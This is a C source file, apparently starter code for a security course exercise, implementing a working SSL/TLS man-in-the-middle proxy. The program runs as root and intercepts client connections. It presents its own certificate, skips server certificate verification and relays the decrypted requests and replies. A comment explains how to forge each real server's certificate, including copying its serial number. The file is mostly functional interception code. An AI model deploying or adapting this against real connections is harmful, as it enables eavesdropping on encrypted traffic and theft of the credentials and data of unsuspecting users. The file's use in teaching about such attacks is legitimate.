/* 
	A man-in-the-middle SSL implementation 
	- This code simply relays information passing between
		the server and the client
	- It presents its own certificate to the client

	(c) Hayawardh Vijayakumar (2013)
	
	Some code borrowed from libopenssl/demos. 
*/
		
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <memory.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

#include <openssl/rsa.h>       
#include <openssl/crypto.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>


#define CHK_NULL(x) if ((x)==NULL) exit (1)

/* Limit ourselves to ~4MB of data */
#define DATA_MAX 4096000
#define SSL_PORT "443"

char *certf = NULL; 
char *keyf = NULL; 

int ssl_read(SSL *ssl, char *buf, int buf_len)
{
	int ret = 0, ctr, done; 
	ctr = 0; 
	do {
		done = 0; 
		ret = SSL_read (ssl, buf + ctr, buf_len - ctr - 1);                   
		switch (SSL_get_error(ssl, ret)) {
			case SSL_ERROR_SSL:
				/* ssl error */
				done = 1; 
				ret = -EFAULT; 
				break; 
			case SSL_ERROR_SYSCALL:
				/* some system call error */
				done = 1;
				ret = (errno == 0) ? ctr : -EFAULT; 
				break; 
			case SSL_ERROR_ZERO_RETURN:
				/* nothing more to read */
				done = 1; 
				ret = ctr; 
				break;
			case SSL_ERROR_NONE:
				ctr += ret; 
				break; 
			case SSL_ERROR_WANT_READ:
			case SSL_ERROR_WANT_WRITE:
				/* XXX: retry the SSL_read? */
				done = 1; 
				ret = ctr; 
				break; 
			default:
				fprintf(stderr, "ERROR:unknown error code"); 
		}
	} while (!done); 

	if (ret > 0) 
		buf[ret] = 0; 
	return ret; 
}

int ssl_write(SSL *ssl, char *buf, int buf_len)
{
	int ret = 0, ctr, done; 
	ctr = 0; 
	do {
		done = 0; 
		ret = SSL_write(ssl, buf + ctr, buf_len - ctr); 
		switch (SSL_get_error(ssl, ret)) {
			case SSL_ERROR_SSL:
				/* ssl error */
				done = 1; 
				ret = -EFAULT; 
				break; 
			case SSL_ERROR_SYSCALL:
				/* some system call error */
				done = 1;
				ret = (errno == 0) ? ctr : -EFAULT; 
				break; 
			case SSL_ERROR_ZERO_RETURN:
				/* nothing more to read */
				done = 1; 
				ret = ctr; 
				break;
			case SSL_ERROR_NONE:
				ctr += ret; 
				break; 
			case SSL_ERROR_WANT_READ:
			case SSL_ERROR_WANT_WRITE:
				/* XXX: retry the SSL_write? */
				done = 1; 
				ret = ctr; 
				break; 
			default:
				fprintf(stderr, "ERROR:unknown error code"); 
		}
	} while (!done); 

	return ret; 
}

int ssl_handshake(SSL *ssl)
{
	int ret = 0, err, done; 
	do {
		done = 0; 
		ret = SSL_do_handshake(ssl);
		err = SSL_get_error(ssl, ret); 
		switch (err) { 
			case SSL_ERROR_SSL:
				done = 1; 
				ret = -EFAULT; 
				break; 
			case SSL_ERROR_SYSCALL:
				/* some system call error */
				done = 1;
				ret = (errno == 0) ? 0 : -EFAULT; 
				break; 
			case SSL_ERROR_ZERO_RETURN:
				/* nothing more to read */
				done = 1; 
				break;
			case SSL_ERROR_NONE:
				ret = 0; 
				done = 1; 
				break; 
			case SSL_ERROR_WANT_READ:
			case SSL_ERROR_WANT_WRITE:
				/* XXX: retry the SSL_handshake? */
				done = 1; 
				break; 
			default:
				fprintf(stderr, "ERROR:unknown error code"); 
		}
	} while (!done); 

	return ret; 
}

void get_server_ip(char *ip, int port, char *dst)
{
        char *cmd;
        int ret;
        FILE *fp;

        memset(dst, 0, 17); 

        ret = asprintf(&cmd, "sudo conntrack -L 2>/dev/null | grep sport=%d | grep src=%s | awk '{print $6}' | cut -d '=' -f 2 | sort -u | head -n1", port, ip); 
        if (ret == -1) {
                perror("error preparing conntrack command");
		goto out; 
        }

        fp = popen(cmd, "r");
        if (fp == NULL) {
                perror("conntrack command failed to execute");
		goto out; 
        }

        while (fgets(dst, 17, fp)); 

        if (dst[strlen(dst) - 1] == '\n')
                dst[strlen(dst) - 1] = '\0';

out:
	fclose(fp); 
	if (cmd)
		free(cmd); 	
}

/* connect to real server and get reply */
char *mitm_client(char *request, int *reply_len, char *server_ip)
{
	int err, ret, sd; 
	struct sockaddr_in sa;
	SSL_CTX *ctx = NULL;
	SSL *ssl = NULL;
	char *buf; 
	const SSL_METHOD *meth;
	struct timeval tv; 

	if (strlen(request) == 0)
		return NULL; 	

	buf = malloc(DATA_MAX); 
	if (!buf)
		return NULL; 
	memset(buf, 0, DATA_MAX); 

	/* Create a socket and connect to server using normal socket calls. */

	sd = socket (AF_INET, SOCK_STREAM, 0);       
	if (sd == -1)
		goto cleanup; 

	memset (&sa, '\0', sizeof(sa));
	sa.sin_family      = AF_INET;
	sa.sin_addr.s_addr = inet_addr (server_ip);   /* Server IP */
	sa.sin_port        = htons     (atoi(SSL_PORT));          /* Server Port number */

	err = connect(sd, (struct sockaddr*) &sa, sizeof(sa));                   
	if (err == -1)
		goto cleanup; 

	/* Now we have the TCP connection. Start SSL negotiation. */
	
	SSLeay_add_ssl_algorithms();
	meth = SSLv23_method();
	SSL_load_error_strings();
	ctx = SSL_CTX_new(meth);                        
	if (ctx == NULL) {
		fprintf(stderr, "ERROR:failed to allocate SSL_CTX object\n"); 
		ERR_print_errors_fp(stderr);
		goto cleanup; 
	}

	SSL_CTX_set_options(ctx, SSL_OP_ALL & ~SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS); 
	SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL); 
	SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY); 

	ssl = SSL_new (ctx);                         
	if (ssl == NULL) {
		fprintf(stderr, "ERROR:failed to allocate SSL object\n"); 
		ERR_print_errors_fp(stderr);
		goto cleanup; 
	}
	SSL_set_fd (ssl, sd);

	/* set receive timeout on underlying socket so as to not block indefinitely */
	tv.tv_sec = 1; /* 1 seconds timeout */
	setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval)); 

	SSL_set_connect_state(ssl); 

	printf("connecting to real server: %s\n", server_ip); 
	
	/* perform handshake and setup ssl connection */
	ret = ssl_handshake(ssl); 
	if (ret < 0) {
		fprintf(stderr, "ERROR:ssl handshake to real server failed\n"); 
		goto cleanup; 
	}

	/* Get the cipher - opt */
	printf ("established SSL connection to real server using cipher: %s\n", SSL_get_cipher (ssl));

	/* relay intercepted client request to real server */
	ret = ssl_write(ssl, request, strlen(request) + 1); 
	if (ret < 0) {
		fprintf(stderr, "ERROR:failed to send intercepted request to real server\n"); 
		goto cleanup; 
	}

	printf("sent intercepted client request to real server\n"); 

	/* get reply from server */
	ret = ssl_read(ssl, buf, DATA_MAX); 
	if (ret < 0) {
		fprintf(stderr, "ERROR:failed to get reply from real server\n"); 
		goto cleanup; 
	}

	printf("received response from real server\n"); 

	*reply_len = ret; 

	SSL_shutdown (ssl);  /* send SSL/TLS close_notify */
	close (sd);
	SSL_free (ssl);
	SSL_CTX_free (ctx);
	return buf; 

cleanup:
	if (ssl) {
		SSL_shutdown (ssl);  /* send SSL/TLS close_notify */
		SSL_free (ssl);
	}
	if (ctx) 
		SSL_CTX_free (ctx); 
	free(buf); 
	close(sd);
	return NULL; 

}

/* 
	handle each intercepted client request 
		- read client request
		- call mitm_client to relay client request and get response from real server
		- relay response to client
*/

void mitm_server(int sd, struct sockaddr_in *sa_cli)
{
	int ret, reply_len; 
	SSL_CTX *ctx = NULL;
	SSL *ssl = NULL;
	char server_ip[17], buf[4096 * 20], *reply = NULL, client_ip[17]; 
	const SSL_METHOD *meth;
	struct timeval tv; 
	
	strncpy(client_ip, inet_ntoa(sa_cli->sin_addr), 17); 
	printf ("intercepted connection from client (ip: %s, port: %d)\n",
		client_ip, ntohs(sa_cli->sin_port));

	get_server_ip(client_ip, ntohs(sa_cli->sin_port), server_ip); 

	if (server_ip[0] == 0) {
		printf("ERROR: error extracting requested server's ip from conntrack\n"); 
		return; 
	}

	/* set receive timeout on underlying socket so as to not block indefinitely */
	tv.tv_sec = 1; /* 1 seconds timeout */
	setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval)); 

	/* SSL preliminaries. We keep the certificate and key with the context. */

	(void) ERR_get_state(); 
	ERR_clear_error();

	SSL_load_error_strings();
	SSLeay_add_ssl_algorithms();
	meth = SSLv23_method();
	ctx = SSL_CTX_new(meth);
	if (ctx == NULL) {
		fprintf(stderr, "ERROR:failed to allocate SSL_CTX object\n"); 
		ERR_print_errors_fp(stderr);
		goto cleanup; 
	}

	if (SSL_CTX_use_certificate_file(ctx, certf, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		goto cleanup; 
	}
	if (SSL_CTX_use_PrivateKey_file(ctx, keyf, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		goto cleanup; 
	}

	if (!SSL_CTX_check_private_key(ctx)) {
		fprintf(stderr, "ERROR:Private key does not match the certificate public key\n");
		goto cleanup; 
	}

	SSL_CTX_set_options(ctx, SSL_OP_ALL & ~SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS); 

	/* we are the MITM. we do not verify the server's certificate because we 
	 do not care! */
	SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL); 

	ssl = SSL_new (ctx);
	if (ssl == NULL) {
		fprintf(stderr, "ERROR:failed to allocate SSL object\n"); 
		ERR_print_errors_fp(stderr);
		goto cleanup; 
	}

	SSL_set_fd (ssl, sd);
	SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY); 

	SSL_set_accept_state(ssl); 

	/* 
	 *	HINT CSE543: instead of using a fixed certificate file and private key file (as above), 
	 * 	we must already have dynamically generated a self-signed version of the 
	 * 	real server's certificate and associated it with the SSL_CTX 
	 *	before we perform the handshake with the real client below! 
	 * 	- Look at demos/ssl/cli.cpp (in libopenssl source) to find out how to connect to the 
	 *	  real server and fetch its certificate and details (server's subject common name)
	 *		- for the exercise you have to also copy the serial number from the real server's
	 *		  certificate to our dynamically generated certificate. 
	 *	- Look at above code (in this function) to get the real server's IP to connect to
	 *	  (to fetch certificate from) 
	 *	- Look at demos/x509/mkcert.c to see how to dynamically generate a key and certificate 
	 *	- Look at manpages for functions SSL_CTX_use_certificate() and SSL_CTX_use_PrivateKey() 
	 * 	  to associate the generated key and certificate with the SSL_CTX above.
	 */

	ret = ssl_handshake(ssl); 
	if (ret < 0) {
		fprintf(stderr, "ERROR:ssl handshake from real client failed\n"); 
		goto cleanup; 
	}
		
	/* Get the cipher - opt */
	printf ("established SSL connection from client using cipher: %s\n", SSL_get_cipher (ssl));

	/* DATA EXCHANGE - Receive message and send reply. */
	
	ret = ssl_read(ssl, buf, sizeof(buf)); 
	if (ret < 0)
		goto cleanup; 
	
	printf("intercepted request from client\n"); 

	reply = mitm_client(buf, &reply_len, server_ip); 
	if (!reply) {
		/* invalid request. bail out */
		fprintf(stderr, "ERROR:empty response from real server\n"); 
	} else {
		/* send back reply */
		ret = ssl_write(ssl, reply, reply_len); 
		if (ret < 0) {
			fprintf(stderr, "ERROR:failed to send intercepted reply to real client\n"); 
			goto cleanup; 
		}
	}

	printf("sent response to client\n"); 
	/* Clean up. */

cleanup:
	if (reply)
		free(reply); 
	close(sd);
	if (ssl)
		SSL_free(ssl);
	if (ctx)
		SSL_CTX_free(ctx);
}

int main (int argc, char *argv[])
{
	int err, listen_sd, sd, c; 
	struct sockaddr_in sa_serv;
	struct sockaddr_in sa_cli;
	size_t client_len;
	char *port; 

	if (geteuid() != 0) {
		printf("MUST run as root\n");
		exit(0); 
	}

	while ((c = getopt(argc, argv, "k:c:p:")) != -1) {
		switch (c) {
		case 'k':
			keyf = optarg; 
			break; 
		case 'c':
			certf = optarg;
			break; 
		case 'p':
			port = optarg; 
			break; 
		}
	
	}
				
	if (keyf == NULL || certf == NULL) {
		printf("USAGE: %s -k keyf -c certf [-p port_to_bind]\n", argv[0]); 
		exit(0); 
	} 

	if (port == NULL) 
		port = SSL_PORT; 

	/* we do not want SIGPIPE if the remote end has closed the pipe before we write to it */
	signal(SIGPIPE, SIG_IGN); 

	/* Prepare TCP socket for receiving connections */

	listen_sd = socket (AF_INET, SOCK_STREAM, 0);   
	if (listen_sd == -1) {
		perror("socket"); 
		exit(1); 
	}

	memset (&sa_serv, '\0', sizeof(sa_serv));
	sa_serv.sin_family      = AF_INET;
	sa_serv.sin_addr.s_addr = INADDR_ANY;
	sa_serv.sin_port        = htons (atoi(port));          

	err = bind(listen_sd, (struct sockaddr*) &sa_serv, sizeof (sa_serv));                   
	if (err == -1) {
		perror("bind"); 
		exit(1); 
	}
	     
	/* Receive a TCP connection. */
	     
	err = listen (listen_sd, 5);                    
	if (err == -1) {
		perror("listen"); 
		exit(1); 
	}

	client_len = sizeof(sa_cli);

	printf("MITM server started on port %s\n", port); 

	while (1) {
		sd = accept (listen_sd, (struct sockaddr*) &sa_cli, &client_len);
		if (sd == -1) {
			perror("accept"); 
			continue; 
		}
		mitm_server(sd, &sa_cli); 
	}

	return 0; 
}

